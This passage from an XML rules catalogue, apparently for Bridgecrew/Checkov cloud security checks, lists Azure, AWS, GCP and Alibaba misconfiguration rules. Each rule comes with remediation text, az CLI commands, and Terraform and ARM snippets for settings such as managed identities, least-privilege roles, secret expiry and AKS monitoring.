</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-the-key-vault-is-recoverable' target='_blank'> https://docs.bridgecrew.io/docs/ensure-the-key-vault-is-recoverable</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-the-key-vault-is-recoverable' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_16</key>
    <name>Ensure App Service is registered with an Azure Active Directory account</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="app-service-is-not-registered-with-an-azure-active-directory-account"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-app-service-is-not-registered-with-an-azure-active-directory-account"></div>App Service is not registered with an Azure Active Directory account</div><a aria-label="Skip link to App Service is not registered with an Azure Active Directory account" class="heading-anchor-icon fa fa-anchor" href="#app-service-is-not-registered-with-an-azure-active-directory-account"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Managed service identity in <strong>App Service</strong> increases security by eliminating secrets from the app, for example, credentials in the connection strings. <strong>App Service</strong> provides a highly-scalable, self-patching web hosting service in Azure. It also provides a managed identity for apps, which is a turn-key solution for securing access to an Azure SQL Database and other Azure services.</p>
<p>We recommend you register the <strong>App Service</strong> with your Azure Active Directory account ensuring the app will connect securely to other Azure services without the need of usernames and passwords.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>App Services</strong>.</li>
<li>For each App, click the App.<br/>
a) Navigate to the <strong>Setting</strong> section.<br/>
b) Click <strong>Identity</strong>.<br/>
c) Set <strong>Status</strong> to <strong>On</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set the <strong>Register with Azure Active Directory</strong> feature for an existing app, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az webapp identity assign 
--resource-group &lt;RESOURCE_GROUP_NAME&gt; 
--name &lt;APP_NAME&gt;
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_app_service</li>
<li><strong>Field</strong>: identity</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
    ...
+    identity {
+        type = "UserAssigned"
+        identity_ids = "12345"
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_iam_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_iam_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_iam_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_35</key>
    <name>Ensure Alibaba RDS instance has log_connections enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-rds-instance-has-log_connections-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-rds-instance-has-log-connections-disabled"></div>Alibaba RDS instance has log_connections disabled</div><a aria-label="Skip link to Alibaba RDS instance has log_connections disabled" class="heading-anchor-icon fa fa-anchor" href="#alibaba-rds-instance-has-log_connections-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-rds-instance-has-log_connections-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-rds-instance-has-log_connections-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-rds-instance-has-log_connections-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_39</key>
    <name>Ensure Azure subscriptions with custom roles have minimum permissions</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-subscriptions-with-custom-roles-are-overly-permissive"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-subscriptions-with-custom-roles-are-overly-permissive"></div>Azure subscriptions with custom roles are overly permissive</div><a aria-label="Skip link to Azure subscriptions with custom roles are overly permissive" class="heading-anchor-icon fa fa-anchor" href="#azure-subscriptions-with-custom-roles-are-overly-permissive"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Subscription ownership should not include permission to create custom owner roles. The principle of least privilege should be followed and only necessary privileges be assigned instead of allowing full administrative access. Classic subscription admin roles offer basic access management and include Account Administrator, Service Administrator, and Co-Administrators. </p>
<p>We recommend the minimum permissions necessary be given to subscription owner accounts initially. Permissions can be added as needed by the account holder. This ensures the account holder cannot perform actions which were not intended.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To provide a list of the role identified, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az role definition list</code></p>
<p>Check for entries with <strong>assignableScope</strong> of <strong>/</strong> or a <strong>subscription</strong>, and an action of <strong>*</strong>.<br/>
To verify the usage and impact of removing the role identified, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az role definition delete --name "rolename"</code></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<h3 align="" class="heading heading-3 header-scroll"><div class="heading-anchor anchor waypoint" id="option-1"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-option-1"></div>Option 1</div><a aria-label="Skip link to Option 1" class="heading-anchor-icon fa fa-anchor" href="#option-1"></a></h3>
<ul>
<li><strong>Resource</strong>: azurerm_role_definition</li>
<li><strong>Argument</strong>: actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_role_definition" "example" {
    name        = "my-custom-role"
    scope       = data.azurerm_subscription.primary.id
    description = "This is a custom role created via Terraform"

    permissions {
    actions     = [
 -    "*"
 +    &lt;selected actions&gt;
     ]
    not_actions = []
    }

    assignable_scopes = [
    "/"
    ]
}
</code></pre></div></div>
<h3 align="" class="heading heading-3 header-scroll"><div class="heading-anchor anchor waypoint" id="option-2"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-option-2"></div>Option 2</div><a aria-label="Skip link to Option 2" class="heading-anchor-icon fa fa-anchor" href="#option-2"></a></h3>
<ul>
<li><strong>Resource</strong>: azurerm_role_definition</li>
<li><strong>Argument</strong>: assignable_scopes</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">JSON</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-json theme-light" data-lang="json" name="">resource "azurerm_role_definition" "example" {
    name        = "my-custom-role"
    scope       = data.azurerm_subscription.primary.id
    description = "This is a custom role created via Terraform"
    permissions {
    actions     = [
     "*"
     ]
    not_actions = []
    }

    assignable_scopes = [
+    &lt;narrower scopes than subscriptions&gt;
-    "/"
-   data.azurerm_subscription.primary.id
-   resource.azurerm_subscription.primary.id
    ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/do-not-create-custom-subscription-owner-roles' target='_blank'> https://docs.bridgecrew.io/docs/do-not-create-custom-subscription-owner-roles</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/do-not-create-custom-subscription-owner-roles' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_88</key>
    <name>Ensure GCP compute firewall ingress does not allow unrestricted MySQL access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-compute-firewall-ingress-allow-unrestricted-mysql-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-compute-firewall-ingress-allow-unrestricted-my-sql-access"></div>GCP compute firewall ingress allow unrestricted MySQL access</div><a aria-label="Skip link to GCP compute firewall ingress allow unrestricted MySQL access" class="heading-anchor-icon fa fa-anchor" href="#gcp-compute-firewall-ingress-allow-unrestricted-mysql-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-compute-firewall-ingress-does-not-allow-unrestricted-mysql-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-compute-firewall-ingress-does-not-allow-unrestricted-mysql-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-compute-firewall-ingress-does-not-allow-unrestricted-mysql-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_41</key>
    <name>Ensure AKV secrets have an expiration date set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="akv-secrets-do-not-have-an-expiration-date-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-akv-secrets-do-not-have-an-expiration-date-set"></div>AKV secrets do not have an expiration date set </div><a aria-label="Skip link to AKV secrets do not have an expiration date set " class="heading-anchor-icon fa fa-anchor" href="#akv-secrets-do-not-have-an-expiration-date-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Azure Key Vault (AKV) enables users to store and keep secrets within the Microsoft Azure environment. Secrets in the AKV are octet sequences with a maximum size of 25k bytes each.<br/>
The exp (expiration time) attribute identifies the expiration time on or after which the secret must not be used. By default, secrets do not expire. </p>
<p>We recommend you rotate secrets in the key vault and set an explicit expiration time for all secrets. This ensures that the secrets cannot be used beyond their assigned lifetimes.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>Key vaults</strong>.</li>
<li>For each Key vault:<br/>
a) Click <strong>Secrets</strong>.<br/>
b) Navigate to <strong>Settings</strong>.<br/>
c) Set <strong>Enabled?</strong> to <strong>Yes</strong>.<br/>
d) Set an appropriate <strong>EXPIRATION DATE</strong> on all secrets.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set an <strong>EXPIRATION DATE</strong> on all secrets, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az keyvault secret set-attributes 
--name &lt;secretName&gt; 
--vault-name &lt;vaultName&gt; 
--expires Y-m-d'T'H:M:S'Z'
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform </div><a aria-label="Skip link to Terraform " class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_key_vault_secret</li>
<li><strong>Argument</strong>: expiration_date</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_key_vault_secret" "example" {
     ...
 +   expiration_date = "2020-12-30T20:00:00Z"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/set-an-expiration-date-on-all-secrets' target='_blank'> https://docs.bridgecrew.io/docs/set-an-expiration-date-on-all-secrets</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/set-an-expiration-date-on-all-secrets' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_239</key>
    <name>Ensure AWS DAX cluster endpoint uses (Transport Layer Security) TLS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-dax-cluster-endpoint-does-not-use-tls-transport-layer-security"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-dax-cluster-endpoint-does-not-use-tls-transport-layer-security"></div>AWS DAX cluster endpoint does not use TLS (Transport Layer Security) </div><a aria-label="Skip link to AWS DAX cluster endpoint does not use TLS (Transport Layer Security) " class="heading-anchor-icon fa fa-anchor" href="#aws-dax-cluster-endpoint-does-not-use-tls-transport-layer-security"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-dax-cluster-endpoint-uses-transport-layer-security-tls' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-dax-cluster-endpoint-uses-transport-layer-security-tls</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-dax-cluster-endpoint-uses-transport-layer-security-tls' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_4</key>
    <name>Ensure Azure AKS cluster monitoring is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-aks-cluster-monitoring-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-aks-cluster-monitoring-is-not-enabled"></div>Azure AKS cluster monitoring is not enabled</div><a aria-label="Skip link to Azure AKS cluster monitoring is not enabled" class="heading-anchor-icon fa fa-anchor" href="#azure-aks-cluster-monitoring-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Azure Monitoring service collects and stores valuable telemetry reported by AKS. This includes: memory and processor metrics for controllers, nodes and containers logs, and logs from the individual containers. This data is accessible through Azure Log Analytics for the AKS cluster and Azure Monitor instance.</p>
<p>We recommend storing memory and processor metrics from containers, nodes, and controllers. This enables strong real-time and post-mortem analysis of unknown behaviors in AKS clusters.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To enable Azure Monitor for an existing AKS cluster, use the following command: </p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az aks enable-addons 
-a monitoring -n rg-weu-my-cluster -g rg-weu-my-cluster-group
--workspace-resource-id 4ab81b6f-c07d-d174-ef26-f4344bad14a
</code></pre>
<p>Use the default Log Analytics workspace:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az aks enable-addons 
-a monitoring -n rg-weu-my-cluster -g rg-weu-my-cluster-group
</code></pre>
<p>This will take a few moments. When complete, you can verify using the show command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az aks show -n rg-weu-my-cluster -g rg-weu-my-cluster-group
</code></pre>
<p>This provides general AKS information, including the following portion for: </p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">addonProfiles
"addonProfiles": {
    "omsagent": {
      "config": {
        "logAnalyticsWorkspaceResourceID":
        "/subscriptions/GUID/resourcegroups/defaultresourcegroup-weu/providers
        /microsoft.operationalinsights/workspaces/defaultworkspace-GUID-weu"
      },
      "enabled": true
    }
  },
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_kubernetes_cluster</li>
<li><strong>Argument</strong>: log_analytics_workspace_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "example" {
  name     = "example-resources"
  location = "West Europe"
}

resource "azurerm_kubernetes_cluster" "example" {
  name                = "example-aks1"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
  dns_prefix          = "exampleaks1"

  default_node_pool {
    name       = "default"
    node_count = 1
    vm_size    = "Standard_D2_v2"
  }

  addon_profile {
    oms_agent {
      enabled                    = true
      log_analytics_workspace_id = "workspaceResourceId"
    }
  }

  tags = {
    Environment = "Production"
  }
}

output "client_certificate" {
  value = azurerm_kubernetes_cluster.example.kube_config.0.client_certificate
}

output "kube_config" {
  value = azurerm_kubernetes_cluster.example.kube_config_raw
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arm-template"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arm-template"></div>ARM Template</div><a aria-label="Skip link to ARM Template" class="heading-anchor-icon fa fa-anchor" href="#arm-template"></a></h2>
<ul>
<li><strong>Resource</strong>: Microsoft.ContainerService/managedClusters</li>
<li><strong>Argument</strong>: logAnalyticsWorkspaceResourceID</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "parameters": {
    "aksResourceId": {
      "type": "string",
      "metadata": {
        "description": "AKS Cluster Resource ID"
      }
    },
    "aksResourceLocation": {
      "type": "string",
      "metadata": {
        "description": "Location of the AKS resource e.g. \"East US\""
      }
    },
    "aksResourceTagValues": {
      "type": "object",
      "metadata": {
        "description": "Existing all tags on AKS Cluster Resource"
      }
    },
    "workspaceResourceId": {
      "type": "string",
      "metadata": {
        "description": "Azure Monitor Log Analytics Resource ID"
      }
    }
  },
  "resources": [
    {
      "name": "[split(parameters('aksResourceId'),'/')[8]]",
      "type": "Microsoft.ContainerService/managedClusters",
      "location": "[parameters('aksResourceLocation')]",
      "tags": "[parameters('aksResourceTagValues')]",
      "apiVersion": "2018-03-31",
      "properties": {
        "mode": "Incremental",
        "id": "[parameters('aksResourceId')]",
        "addonProfiles": {
          "omsagent": {
            "enabled": true,
            "config": {
+             "logAnalyticsWorkspaceResourceID": "[parameters('workspaceResourceId')]"
            }
          }
        }
      }
    }
  ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_kubernetes_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_kubernetes_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_kubernetes_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_5</key>
    <name>Ensure Azure AKS enable RBAC is enforced</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-aks-enable-rbac-not-enforced"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-aks-enable-rbac-not-enforced"></div>Azure AKS enable RBAC not enforced</div><a aria-label="Skip link to Azure AKS enable RBAC not enforced" class="heading-anchor-icon fa fa-anchor" href="#azure-aks-enable-rbac-not-enforced"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Kubernetes Service (AKS) can be configured to use Azure Active Directory (AD) and Kubernetes Role-based Access Control (RBAC). RBAC is designed to work on resources within your AKS clusters. With RBAC, you can create a role definition that outlines the permissions to be applied. A user or group is then assigned this role definition for a particular scope, which could be an individual resource, a resource group, or across the subscription.</p>
<p>We recommend you sign in to an AKS cluster using an Azure AD authentication token and configure Kubernetes RBAC. This will limit access to cluster resources based a user's identity or group membership.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_kubernetes_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_kubernetes_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_kubernetes_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
